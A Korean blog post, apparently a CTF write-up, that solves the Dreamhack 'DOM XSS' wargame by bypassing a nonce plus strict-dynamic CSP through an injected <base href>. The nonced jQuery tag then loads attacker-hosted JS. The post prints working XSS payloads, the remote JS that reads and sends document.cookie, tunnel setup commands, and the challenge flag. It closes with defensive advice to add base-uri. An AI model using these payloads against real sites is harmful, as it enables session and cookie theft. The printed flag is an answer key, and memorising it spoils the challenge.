---
layout: post
title:  "Dreamhack 워게임 DOM XSS 풀이 — strict-dynamic + nonce CSP 뚫기 (base href 트릭)"
date:   2026-05-16 17:30:00 +0900
categories: security web wargame dreamhack writeup xss csp dom-xss
---

## 들어가며

Dreamhack 웹해킹 워게임 **DOM XSS** (id 438, 풀이자 1068명+, Unrated) 풀이입니다.

이름 그대로 `location.hash` 가 `innerHTML` 에 박히는 정통 DOM-based XSS 인데, 한 가지 함정이 있다 — **`script-src 'self' 'nonce-X' 'strict-dynamic'`** CSP 가 걸려 있어서, 기존 typical 한 `<img src=x onerror=...>` 류 페이로드가 **전부 막힌다**.

핵심 트릭은 한 줄:

```
param=<base href="https://attacker.example/">
```

그리고 attacker 측에는 `/static/js/jquery.min.js` 경로에 우리 JS 가 떠 있으면 끝.

```js
// attacker 가 호스팅하는 JS
fetch("http://127.0.0.1:8000/memo?memo=fetch_" + encodeURIComponent(document.cookie));
location.href = "http://127.0.0.1:8000/memo?memo=nav_" + encodeURIComponent(document.cookie);
```

봇의 chrome 이 `<base href>` 때문에 jQuery 를 attacker 서버에서 받아서 실행해버린다. nonce 는 원래 페이지에 박혀 있던 게 그대로 element 에 따라가니까 strict-dynamic + nonce CSP 가 **막을 명분이 없다**. 그렇게 받은 코드는 `document.cookie` (=`flag=DH{...}`) 를 `/memo?memo=...` 에 박아 저장하고, 나는 `/memo` 만 GET 해서 읽으면 끝.

```bash
$ curl "$URL/memo"
... (중략) ...
fetch_flag=DH{f246f75f094da605e087bb5c0916c0d2}
nav_flag=DH{f246f75f094da605e087bb5c0916c0d2}
```

이 글은 **처음 문제를 마주한 시점부터** 어떻게 막다른 길들을 만나고, 어떤 단서에서 `<base>` 트릭을 떠올렸는지, 그리고 어디서 **2시간 가까이 헛수고** 를 했는지 (스포: ngrok 의 browser warning 페이지) 까지 step-by-step 으로 풀어쓴 노트.

> Note: 정보보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

---

## 0. DOM-based XSS 가 뭔지 30초 복습

XSS 는 크게 세 종류로 나뉜다.

| 종류 | 어디서 처리됨 | 페이로드 위치 |
|------|--------------|--------------|
| Stored XSS | 서버가 DB 에 저장, 다시 렌더링 | 서버 |
| Reflected XSS | 요청 파라미터를 서버가 그대로 응답에 박음 | 서버 |
| **DOM-based XSS** | **클라이언트 JS 가 직접 DOM 조작** | **브라우저** |

DOM-based 의 특징은 **서버 로그만 봐서는 안 보임**. 페이로드가 `#fragment` (URL 의 `#` 뒤 부분) 에 있을 때, 브라우저는 fragment 를 서버로 전송하지 않기 때문. 서버는 멀쩡한 요청만 보고, 클라이언트 JS 가 자기 발등 찍는 식.

이 문제는 그 정의에 정확히 부합한다.

---

## 1. 소스 정독

문제 페이지 들어가서 **문제 파일 받기** 누르면 zip 하나. `~/claude-workspace/wargame/dom-xss-438/` 에 풀어보면:

```
deploy/
  app.py
  flag.txt
  static/css|js|fonts/  ... (Bootstrap 3.3.2 + jQuery 1.12.4)
  templates/
    base.html
    index.html
    vuln.html
    flag.html
    memo.html
Dockerfile
```

### 1-1. 라우트 한눈에

```python
@app.route("/")          # index
@app.route("/vuln")      # param=X#name  ← DOM XSS sink
@app.route("/memo")      # memo=X  ← 서버측 저장소 (우리의 exfil 채널)
@app.route("/flag", methods=["GET","POST"])  # bot 호출
```

`/flag` POST 가 핵심 진입점이다.

```python
elif request.method == "POST":
    param = request.form.get("param")
    name = request.form.get("name")
    if not check_xss(param, name, {"name": "flag", "value": FLAG.strip()}):
        return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'
    return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'
```

봇이 `flag` 라는 이름으로 진짜 플래그 값을 쿠키에 박은 채 우리가 준 URL 을 방문한다 → 즉, **봇 브라우저 안에서 XSS 를 터뜨려서 `document.cookie` 를 빼와야 한다**.

### 1-2. 봇이 뭘 하는지 (`read_url`)

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in ["headless", "window-size=1920x1080", "disable-gpu",
                  "no-sandbox", "disable-dev-shm-usage"]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")      # ① 도메인 등록 목적의 warm-up
        driver.add_cookie(cookie)                  # ② flag 쿠키 set
        driver.get(url)                            # ③ 우리가 준 URL 방문
    except Exception:
        driver.quit(); return False
    driver.quit(); return True
```

세 가지 포인트:

- 쿠키에 `httpOnly` 명시 안 했음 → 기본 false → **`document.cookie` 로 읽을 수 있음**.
- `set_page_load_timeout(3)` — 페이지 로드 3초 안에 끝나야 함. exfil 코드도 3초 안에 발사돼야 함.
- `check_xss` 의 리턴값은 **그냥 봇이 예외 없이 URL 을 방문했는지** 만 본다. XSS 가 실제로 터졌는지는 확인하지 않음. 그래서 봇이 "good" 을 외쳐도 XSS 가 터졌단 보장은 없음 — 우리는 별도 채널 (=`/memo`) 로 확인해야 한다.

### 1-3. 취약점 sink — `vuln.html`

```html
<script nonce={{ nonce }}>
  window.addEventListener("load", function() {
    var name_elem = document.getElementById("name");
    name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
  });
</script>
{{ param | safe }}
<pre id="name"></pre>
```

두 개의 sink 가 있다.

- **DOM sink**: `location.hash.slice(1)` 을 `innerHTML` 에 박는다. `#<img src=x onerror=alert(1)>` 같은 hash 가 들어오면 그대로 DOM 으로 파싱.
- **Reflected sink**: `{{ param | safe }}` — `param` 쿼리가 **HTML 이스케이프 없이** 그대로 박힌다. 즉, `param=<script>...</script>` 가 서버 응답에 raw 로 들어간다.

CSP 만 없었으면 이 둘 중 아무거나 잡아서 끝났을 문제다.

### 1-4. 그런데 CSP

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"img-src https://dreamhack.io; "
        f"style-src 'self' 'unsafe-inline'; "
        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
    )
    nonce = os.urandom(16).hex()
    return response
```

각 directive 가 의미하는 바:

| Directive | 값 | 의미 |
|-----------|----|----|
| `default-src` | `'self'` | 명시 안 한 directive 의 기본값 — 동일 출처만 |
| `img-src` | `https://dreamhack.io` | 이미지는 dreamhack.io 만 (`/self` 도 X) |
| `style-src` | `'self' 'unsafe-inline'` | 동일출처 + inline `<style>` 허용 |
| `script-src` | `'self' 'nonce-XXX' 'strict-dynamic'` | nonce 일치 또는 trusted script 가 dynamic 하게 로드한 것만 |

핵심은 **`'strict-dynamic'`**. CSP3 spec 에 따르면 `'strict-dynamic'` 이 있으면 **`'self'` 와 host-source 들이 무시되고, 오직 nonce / hash / trusted-script-that-loaded-it 만 허용된다**.

즉, 우리가 흔히 쓰는:

- `<script>alert(1)</script>` — nonce 없음 → **차단**
- `<img src=x onerror=alert(1)>` — `onerror` 는 inline event handler → `'unsafe-inline'` 없음 → **차단**
- `<svg onload=alert(1)>` — 같은 이유로 **차단**
- `<iframe src="data:text/html,<script>...</script>">` — data: URL 은 default-src `'self'` 미허용 → **차단**
- `<iframe srcdoc="<script>...</script>">` — Chrome 에서 srcdoc 은 부모 CSP 를 inherit → **차단**

그리고 nonce 는:

- `os.urandom(16).hex()` — 매 응답마다 새로 생성 (128bit, 예측 불가)
- 응답에 박힌 nonce 와 CSP header 의 nonce 가 일치
- `<script nonce=...>` 든 `<script src=... nonce=...>` 든, **이 nonce 가 있어야 실행됨**

이제 게임의 룰이 명확해진다. **어떻게 우리 코드를 봇 브라우저에서 실행시키느냐**.

---

## 2. 처음 1시간 — 막다른 길들

여기는 솔직하게 다 적는다. (회고 섹션에서 정리하지만, 본문에서도 흐름을 보여주는 게 학습에 도움이 됨)

### 2-1. 기본 페이로드 — 전부 막힘 (예상대로)

```bash
# 1. <img onerror> via hash
POST /flag  param=a&name=<img src=x onerror="fetch('/memo?memo=onerror'+document.cookie)">

# 2. <svg onload> via hash
POST /flag  param=a&name=<svg/onload=document.location='/memo?memo=svg_'+document.cookie>

# 3. 서버측 reflection 으로 <script>
POST /flag  param=<script>fetch('/memo?memo=server_script')</script>&name=a

# 4. srcdoc iframe
POST /flag  param=<iframe srcdoc="<script>parent.fetch('/memo?memo=srcdoc')</script>"></iframe>&name=a
```

전부 `/memo` 에 흔적 안 남음. CSP 가 단단함을 확인.

### 2-2. 봇이 살아있긴 함

CSP 가 막는 거지 봇 자체는 동작한다. 그걸 어떻게 확인하느냐:

```html
<iframe src="/memo?memo=bot_visited"></iframe>
```

`<iframe>` 의 src 는 frame-src (=default-src `'self'`) 가 적용되니까 `/self` URL 은 허용. CSP 를 우회하지 않고도 **봇이 `/memo` 를 fetch 해서 텍스트를 적어준다**.

```bash
$ curl "$URL/memo"
... bot_visited
```

→ 봇은 살아있고 우리가 준 HTML 을 파싱한다. 단지 **JS 실행만 봉쇄됐을 뿐**.

`<object type="text/html" data="/memo?memo=test6_object">` 도 마찬가지로 통과. 즉, 우리는 **봇으로 임의의 동일출처 GET 요청은 만들 수 있다**. 하지만 그 URL 에 `document.cookie` 를 넣으려면 **JS 실행이 필요하다**. 닭과 달걀.

### 2-3. strict-dynamic 의 빈틈을 노린다 — base href 트릭

`strict-dynamic` 의 정의를 다시 본다:

> `'strict-dynamic'` 이 있으면 host-source / scheme-source / `'self'` 가 **무시**된다.
> 즉 nonce 가 일치하는 `<script>` 는 **출처가 어디든** 실행된다.

핵심 통찰: **이미 페이지에 박혀 있는 jQuery 와 Bootstrap 의 `<script>` 태그에는 valid nonce 가 있다**.

`base.html`:

```html
<script src="{{ url_for('static', filename='js/jquery.min.js') }}" nonce={{ nonce }}></script>
<script src="{{ url_for('static', filename='js/bootstrap.min.js') }}" nonce={{ nonce }}></script>
```

여기에 `<base href="https://attacker/">` 를 끼워넣으면, 브라우저가 `<script src="/static/js/jquery.min.js">` 를 resolve 할 때 **attacker URL 로 redirect 된다**.

그리고 그 `<script>` 태그는 여전히 valid nonce 를 갖고 있다. CSP 의 `strict-dynamic + nonce` 룰 상 **출처는 무시되고 nonce 만 본다** → 통과 → attacker 가 준 JS 가 실행된다.

이론적으로 완벽한 우회. 페이로드:

```
param=<base href="https://attacker.example/">
```

봇이 받을 HTML 의 흐름:

```html
<div class="container">
  <script nonce=N>... innerHTML ...</script>
  <base href="https://attacker.example/">   ← 우리가 박은 거
  <pre id="name"></pre>
</div>
<script src="/static/js/jquery.min.js" nonce=N></script>   ← src 가 base 로 resolve
```

기대 동작:

1. `<base>` 처리 → 이후 relative URL 은 attacker base 기준
2. `<script src="/static/js/jquery.min.js" nonce=N>` 가 `https://attacker.example/static/js/jquery.min.js` 로 resolve
3. attacker 가 보내준 JS 가 실행 (`nonce` 가 일치하므로 strict-dynamic 통과)
4. JS 에서 `document.cookie` 읽어서 `/memo?memo=...` 로 보내기

문제 — **나의 attacker 서버는 어디?**

---

## 3. 1차 시도 — webhook.site 와 ngrok 의 함정

### 3-1. webhook.site 의 404 함정

`/static/js/jquery.min.js` 는 절대 경로. `<base href="https://webhook.site/UUID/">` 로 redirect 하면 최종 URL 은 `https://webhook.site/static/js/jquery.min.js` (절대 경로니까 base 의 path 부분은 **덮어쓰임**).

webhook.site 는 UUID 매칭이 안 되는 path 에 대해 **404** 를 돌려준다. content-type 은 application/javascript 로 설정해도 status 가 404 면 chrome 은 script 를 실행하지 않는다 (HTML spec — 4xx/5xx 응답은 script 실행 안 됨, error 이벤트만 발사).

→ webhook.site 는 이 공격에 부적합.

### 3-2. ngrok 의 browser warning 함정

ngrok 으로 로컬 Python http 서버 (`python3 -m http.server 8765`) 를 터널링:

```bash
mkdir -p /tmp/srv/static/js
echo 'fetch("http://127.0.0.1:8000/memo?memo="+document.cookie)' > /tmp/srv/static/js/jquery.min.js
cd /tmp/srv && python3 -m http.server 8765 &
ngrok http 8765
# → https://f6de-211-219-27-111.ngrok-free.app
```

curl 로 확인:

```bash
$ curl -i https://f6de-.../static/js/jquery.min.js
HTTP/2 200
content-type: text/javascript
fetch("http://127.0.0.1:8000/memo?memo="+document.cookie)
```

좋아 보임. 페이로드 제출:

```
param=<base href="https://f6de-211-219-27-111.ngrok-free.app/">
```

`/memo` 확인 → **흔적 없음**. ngrok 로그 확인 → **봇에서 요청 안 옴**.

여기서 한참 헤맸다. 원인 추적:

```bash
# curl 에 chrome UA 를 박아보면
$ curl -i -A "Mozilla/5.0 ... HeadlessChrome/114.0.0.0 ..." https://f6de-.../static/js/jquery.min.js
HTTP/2 200
content-type: text/html      # ← !!! JS 가 아니라 HTML
ngrok-error-code: ERR_NGROK_6024

<!DOCTYPE html>
<html>
  <head>... ngrok visit warning page ...
```

→ **ngrok free tier 는 브라우저 UA 를 감지하면 경고 페이지로 가로챈다**. `ngrok-skip-browser-warning` 헤더를 보내야 우회되는데, `<script src>` 로는 헤더를 못 박는다. 봇은 chrome UA 로 요청을 보내니까 항상 HTML warning 페이지를 받음. JS 로 파싱하면 SyntaxError → 실행 안 됨.

이 한 가지 사실이 1시간 가까이 안 보였다. 회고 섹션에서 다시 다룸.

### 3-3. cloudflared 로 전환

cloudflared (Cloudflare Tunnel) 는 free tier 에서도 warning 페이지 없이 그냥 통과시켜준다.

```bash
brew install cloudflared
cloudflared tunnel --url http://localhost:8765
# → https://wallpaper-barely-clean-antenna.trycloudflare.com
```

curl 에 browser UA 박아도:

```bash
$ curl -i -A "Mozilla/5.0 ... HeadlessChrome/114 ..." \
     https://wallpaper-barely-clean-antenna.trycloudflare.com/static/js/jquery.min.js
HTTP/2 200
content-type: text/javascript
fetch("http://127.0.0.1:8000/memo?memo=fetch_"+encodeURIComponent(document.cookie));
location.href="http://127.0.0.1:8000/memo?memo=nav_"+encodeURIComponent(document.cookie);
```

**JS 가 그대로 200 으로 옴**. 완벽.

---

## 4. 최종 익스플로잇

### 4-1. attacker 측 (cloudflared 너머의 local Python)

`/tmp/srv/static/js/jquery.min.js`:

```js
fetch("http://127.0.0.1:8000/memo?memo=fetch_" + encodeURIComponent(document.cookie));
location.href = "http://127.0.0.1:8000/memo?memo=nav_" + encodeURIComponent(document.cookie);
```

(둘 다 박은 이유 — 하나는 `fetch` (비동기 동일출처 요청), 하나는 navigation. 페이지 로드 타임아웃 3초 안에 적어도 하나는 발사되도록 보험.)

### 4-2. /flag 호출

```bash
CFURL="https://wallpaper-barely-clean-antenna.trycloudflare.com"
curl -s -X POST "$URL/flag" \
  --data-urlencode "param=<base href=\"$CFURL/\">" \
  --data-urlencode "name=t"
# → <script nonce=...>alert("good");history.go(-1);</script>
```

### 4-3. /memo 확인

```bash
$ curl -s "$URL/memo"
... 중략 ...
<pre>hello
...
fetch_flag=DH{f246f75f094da605e087bb5c0916c0d2}
nav_flag=DH{f246f75f094da605e087bb5c0916c0d2}
</pre>
```

**🚩 `DH{f246f75f094da605e087bb5c0916c0d2}`** — 제출 → 정답.

---

## 5. 한 번 더 정리 — 왜 이게 통하는가

CSP 가 `strict-dynamic` 을 쓸 때의 보안 모델은:

> *"트러스트는 nonce 가 박힌 root script 와, 그 script 들이 dynamic 하게 만들어내는 후손 script 에만 부여된다."*

이 모델의 **암묵적인 가정** 은 다음 두 가지:

1. nonce 가 박힌 script tag 의 **`src` 는 개발자가 의도한 출처를 가리킨다**.
2. 공격자는 페이지 안에 자기 마음대로 element 를 끼워넣을 수 없거나, 끼워넣더라도 nonce 를 모른다.

이 문제는 가정 1 을 정확히 깬다. `<base href>` 는 페이지에 박힌 모든 relative URL 의 base 를 바꾸는 **legitimate HTML 기능** 인데, `base-uri` directive 로 명시 차단되지 않는 한 공격자가 (HTML 인젝션이 가능하다면) 자유롭게 박을 수 있다.

| 보호장치 | 이 문제 | 동작 |
|---------|--------|------|
| `script-src 'self'` | ❌ (strict-dynamic 에 의해 무시) | 의미없음 |
| `script-src 'nonce-X'` | ✅ | nonce 만 맞으면 어디서든 OK |
| `script-src 'strict-dynamic'` | ✅ | 트러스트 전파 |
| **`base-uri 'self'`** | **❌ (없음)** | **← 빈틈** |

**올바른 방어:** `base-uri 'none'` 또는 `base-uri 'self'` 를 CSP 에 추가하면 `<base href>` 인젝션이 막힌다.

---

## 6. 시도한 것 중 실패한 것들 — 회고

이 섹션은 **앞으로 비슷한 문제 앞에서 같은 함정에 안 빠지기 위한** 자기 점검 노트.

### 6-1. 헛수고 1 — inline handler 가 막힌다는 걸 받아들이는 데 너무 오래 걸림

`<svg onload>`, `<img onerror>`, `<details ontoggle>`, `<marquee onstart>`... 다양한 inline event handler 를 한 번씩 다 시도했다. CSP 가 `'unsafe-inline'` 없이 `nonce-...` + `'strict-dynamic'` 만 있으면 inline handler 는 절대 안 풀린다.

**다음엔:** CSP 헤더를 처음 보는 순간 5초만 분석한다. `script-src` 에 `'unsafe-inline'` 또는 inline handler 용 hash 가 있는지 확인. 없으면 inline handler 류 페이로드는 처음부터 후보에서 제외.

### 6-2. 헛수고 2 — `<base href>` 를 본문에 박았는데 안 통할 거라 잠시 단정

`<base>` 는 spec 상 `<head>` 에 있어야 하지만 대부분 브라우저는 `<body>` 에 있어도 `baseURI` 를 갱신한다. 처음에 실패했을 때 **"chrome 의 preload scanner 가 `<base>` 를 무시하고 원래 URL 로 preload 해서 그걸 쓰는 거 아닐까"** 하는 가설을 세웠다.

이 가설 검증을 위해 ngrok 로그 확인 → 봇에서 ngrok 으로 요청 없음 → "역시 preload 가 문제구나" 라고 잘못 결론. 진짜 원인은 ngrok 의 browser warning 페이지였다.

**다음엔:** **outbound 측 (cloudflared/ngrok 서버) 의 응답을 victim 의 UA 로 시뮬레이션 해본다**. `curl -A "<chrome UA>"` 한 줄이면 즉시 알 수 있는 걸 1시간 걸려 찾음. 외부 서비스를 끼울 땐 항상 **"victim 의 User-Agent 로 그 URL 을 직접 GET 해보면 어떻게 보이나"** 부터.

### 6-3. 헛수고 3 — webhook.site 의 404

webhook.site 는 free 모드에서 **루트 URL 한정** 으로만 default response 를 돌려준다. 서브패스 (`/static/js/jquery.min.js`) 는 404. 그리고 chrome 은 404 response 의 body 는 JS 로 실행하지 않는다 (status code 가 4xx/5xx 면 error 이벤트만 발사).

이걸 헷갈려서 "내 default_status: 200 설정이 적용 안 되네?" 하고 webhook.site API 를 한참 들여다봤다.

**다음엔:** **응답 status code 를 먼저 보고, 그 다음 body 를 본다**. `curl -i` 의 첫 줄을 무시하지 말 것.

### 6-4. 헛수고 4 — nonce 추출에 시간 씀

처음에 "어떻게든 응답에 박힌 nonce 를 빼낼 수 없을까" 하고 dangling markup, CSS attribute selector, race condition on Flask threading 등을 한참 검토. 결론은 모두 **불가**:

- Chrome 73+ 부터 `script.getAttribute('nonce')` 와 `script.nonce` IDL property 가 **DOM 컨텍스트에서 빈 문자열** 반환 (CSS 셀렉터 `script[nonce^="X"]` 도 매치 안 됨). 명시적으로 nonce exfiltration 차단.
- Flask threading race 도, 봇의 응답 nonce 를 우리가 미리 알아야 페이로드를 작성할 수 있는데 nonce 는 `os.urandom(16)` 이라 예측 불가.

**다음엔:** strict-dynamic CSP 우회 우선순위는 (a) HTML-only sink (base, link, iframe src, etc.) 부터 → (b) trusted script 의 gadget (jQuery `$.html()` 등) → (c) race condition / nonce extraction. (c) 는 거의 가망 없으니 먼저 (a) 를 충분히 탐색.

### 6-5. 헛수고 5 — Bootstrap auto-init 에서 HTML 삼키는 gadget 찾기

Bootstrap 3.3.2 의 `$(window).on('load')` auto-init 코드 — Carousel, ScrollSpy, Affix — 가 우리 data attribute 를 jQuery `$()` 에 넘기면서 HTML 로 해석해주는 gadget 이 있나 싶어 한참 뒤짐. 결론은 없음. ScrollSpy 의 `data-target` 은 `' .nav li > a'` 와 concat 되어 jQuery `$()` 에서 selector 로 취급되니 HTML 파싱이 안 됨.

**다음엔:** trusted-script gadget 찾을 땐 **"이 plugin 이 호출하는 jQuery 메서드의 (a) 어떤 인자가 (b) 사용자 제어 가능한가"** 두 가지를 동시에 만족해야 함. Bootstrap 3 의 auto-init 셋 중 그 조합은 없다 (popover/tooltip 은 explicit init 필요).

### 6-6. 헛수고 6 — data: URL iframe

`<iframe src="data:text/html,<script>...">` — data URL iframe 은 CSP3 spec 상 부모의 CSP 를 inherit. Chrome 도 마찬가지. 그리고 frame-src 가 default-src `'self'` 라 data: 는 출처 자체로도 차단.

**다음엔:** CSP 가 default-src `'self'` 면 (a) data: URL iframe (b) cross-origin iframe (c) srcdoc 안의 script (parent CSP inherit) 셋 다 미리 제외.

---

## 7. 마무리

배운 것:

1. **`strict-dynamic` 도 만능 아님** — `base-uri` directive 가 없으면 `<base href>` 한 줄로 nonce 의 호스트 검증이 우회된다. 실전 CSP 작성 시 `base-uri 'none'` (또는 `'self'`) 을 빼먹지 말 것.
2. **외부 터널 서비스의 "victim UA 응답"** 을 항상 미리 시뮬레이션 — ngrok-free 의 browser warning 같은 함정이 흔함.
3. **status code 와 content-type 둘 다** 확인 — 200 + JS content-type 이어야 chrome 이 `<script src>` 응답을 실행.
4. CSP3 이후 nonce 의 DOM 측 가시성이 차단됐다 — nonce extraction 류 우회는 거의 죽은 길.
5. DOM XSS 의 sink 분석은 단순한데, 그 옆에 CSP 가 같이 있으면 **공격 가능한 sink + 우회 가능한 CSP** 의 교집합을 찾는 퍼즐이 된다.

문제 자체는 학습용 exercise 인데, 풀고 보니 strict-dynamic CSP 의 실전 weak spot 인 `base-uri` 빈틈을 정확히 짚어주는 좋은 문제였다.

🚩 `DH{f246f75f094da605e087bb5c0916c0d2}`
